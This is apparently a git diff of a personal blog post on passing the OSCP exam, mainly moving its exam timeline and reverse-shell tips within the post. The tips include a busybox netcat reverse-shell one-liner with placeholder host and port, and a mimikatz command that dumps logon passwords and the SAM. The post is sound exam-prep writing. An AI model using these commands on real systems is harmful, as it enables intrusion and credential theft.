@@ -6,7 +6,7 @@ image: https://i.ytimg.com/vi/qqGb25h-5Y8/maxresdefault.jpg
 featured: true
 title: How I Passed the OSCP
 date: 2024-09-18T18:38:38.550Z
-lastmod: 2024-09-20T13:39:55.238Z
+lastmod: 2024-09-20T16:41:11.049Z
 ---
 I passed the OSCP just six months into my cybersecurity journey, despite having limited prior experience.\
 Before this, I had mainly worked with MERN Stack Web Development and experimented with Arch Linux and was fully immersed in all things Linux.
@@ -54,7 +54,8 @@ I would recommend to do this list of [recommendations](https://wiki.vulnlab.com/
 
 # Buying the course
 
-Ok I'll admit, shelling out \$2,599 for the Learn One subscription was a bit terrifying and the stakes were never higher.\
+Ok I'll admit, shelling out \$2,599 for the Learn One subscription was a bit terrifying and the stakes were never higher.
+
 ![money.gif](/postimgs/Images/money.gif)\
 I opted the one year subscription and started it from May 24th.
 
@@ -70,6 +71,37 @@ I did all the challenge labs except Skylark which I had completed 50% of. Medtec
 
 OSCP A,B and C were exam-like and had 3 machines for AD network and 3 standalones. I found them much easier than the actual exam.
 
+# Exam Experience
+
+![studying-windy.gif](/postimgs/Images/studying-windy.gif)
+
+I booked my exam for September 15, 2024, nearly 4 months after purchasing the course. Although I never felt fully prepared, I bit the bullet and went for it. The exam turned out to be much tougher than I expected.
+
+This is the timeline of my exam:
+
+**September 15th**
+
+* **11:30 AM:** I completed the initial procedure with the proctor, verified my government ID, and then connected to the exam VPN.
+* **11:45 AM:** I started scanning the MS01 machine on the AD network and began working on it.
+* **1:00 PM:** The MS01 machine was relatively easy to crack, and I pwned it. This is when things started going downhill. I struggled to find a foothold for MS02, and that’s when I realized I was stuck. I started panicking, so I took a 30-minute break to calm myself down.
+* **2:30 PM:** I abandoned the previous path I was on (this turned out to be the best move since it was a rabbit hole anyway). I began thoroughly enumerating the machine.
+* **3:45 PM:** The MS02 machine was finally pwned, and I started looking for the path to the Domain Controller.
+* **5:00 PM:** I finally got the credentials for Domain Admin and could relax a bit. This took a while because I was being slow and methodical, avoiding another rabbit hole.
+* **5:20 PM:** I submitted all the proofs for the AD network, double-checked my notes to ensure I had all the screenshots, and then started on the standalone machine.
+* **5:40 PM:** I gained a foothold on one of the standalone machines, which was easy for me since I chose a Linux system—my strong suit.
+* **6:20 PM:** I achieved root access on the standalone. Then I took a break for dinner before starting on the next machine.
+* **7:00 PM:** I started working on the next standalone machine and had a harder time gaining a foothold as it was more complicated.
+* **8:00 PM:** I gained a foothold on standalone #2.
+* **9:00 PM:** I successfully pwned the second standalone machine and began working on the report.
+
+**September 16th**
+
+* **4:00 AM:** I stayed up all night finishing the report and ensuring all the proofs were submitted and screenshots were properly taken.
+
+**September 19th**
+
+* **8:30 PM:** I finally received the email that I passed, and a wave of relief washed over me. Time to celebrate!
+
 # Tips & Tricks
 
 ![coin.gif](/postimgs/Images/coin.gif)
@@ -77,6 +109,21 @@ OSCP A,B and C were exam-like and had 3 machines for AD network and 3 standalone
 Whenever you are hacking a machine don't be afraid to lookup hints, it's always better to learn what you don't know than stumbling around in the dark but only look it up when you have already tried everything you know.
 
 The main tip I would like to give is anything you find even slightly suspicious search about it on [HackTricks](https://book.hacktricks.xyz/). It is a great resource and helped me immensely to pass the exam.
+
+### Reverse Shells
+
+For reverse shells use [revshells.com](https://www.revshells.com/) for both windows and Linux
+
+For Linux reverse shells try using busybox first as I found that to be the most reliable:
+
+```bash
+busybox nc <ip> <port> -e sh
+```
+
+For Windows try the Powershell Base64 encoded from revshells.com
+
+And note that you can use the same reverse shell (for example reverse.exe you generated using msfvenom) multiple times.\
+Once a reverse shell is connected you can start a listener again and connect to the same port once again.
 
 ## Windows Privilege Escalation
 
@@ -284,52 +331,6 @@ When it comes to AD methodology is very important as missing one minor detail ca
   .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
   ```
 * Enumerate files manually. Use `tree /F` on `C:\Users` to display all files in the users directory recursively.
-
-### Reverse Shells
-
-For reverse shells use [revshells.com](https://www.revshells.com/) for both windows and Linux
-
-For Linux reverse shells try using busybox first as I found that to be the most reliable:
-
-```bash
-busybox nc <ip> <port> -e sh
-```
-
-For Windows try the Powershell Base64 encoded from revshells.com
-
-And note that you can use the same reverse shell (for example reverse.exe you generated using msfvenom) multiple times.\
-Once a reverse shell is connected you can start a listener again and connect to the same port once again.
-
-# Exam Experience
-
-![studying-windy.gif](/postimgs/Images/studying-windy.gif)
-
-I booked my exam for September 15, 2024, nearly 4 months after purchasing the course. Although I never felt fully prepared, I bit the bullet and went for it. The exam turned out to be much tougher than I expected.
-
-This is the timeline of my exam:
-
-**September 15th**
-
-* **11:30 AM:** I completed the initial procedure with the proctor, verified my government ID, and then connected to the exam VPN.
-* **11:45 AM:** I started scanning the MS01 machine on the AD network and began working on it.
-* **1:00 PM:** The MS01 machine was relatively easy to crack, and I pwned it. This is when things started going downhill. I struggled to find a foothold for MS02, and that’s when I realized I was stuck. I started panicking, so I took a 30-minute break to calm myself down.
-* **2:30 PM:** I abandoned the previous path I was on (this turned out to be the best move since it was a rabbit hole anyway). I began thoroughly enumerating the machine.
-* **3:45 PM:** The MS02 machine was finally pwned, and I started looking for the path to the Domain Controller.
-* **5:00 PM:** I finally got the credentials for Domain Admin and could relax a bit. This took a while because I was being slow and methodical, avoiding another rabbit hole.
-* **5:20 PM:** I submitted all the proofs for the AD network, double-checked my notes to ensure I had all the screenshots, and then started on the standalone machine.
-* **5:40 PM:** I gained a foothold on one of the standalone machines, which was easy for me since I chose a Linux system—my strong suit.
-* **6:20 PM:** I achieved root access on the standalone. Then I took a break for dinner before starting on the next machine.
-* **7:00 PM:** I started working on the next standalone machine and had a harder time gaining a foothold as it was more complicated.
-* **8:00 PM:** I gained a foothold on standalone #2.
-* **9:00 PM:** I successfully pwned the second standalone machine and began working on the report.
-
-**September 16th**
-
-* **4:00 AM:** I stayed up all night finishing the report and ensuring all the proofs were submitted and screenshots were properly taken.
-
-**September 19th**
-
-* **8:30 PM:** I finally received the email that I passed, and a wave of relief washed over me. Time to celebrate!
 
 # Conclusion
 
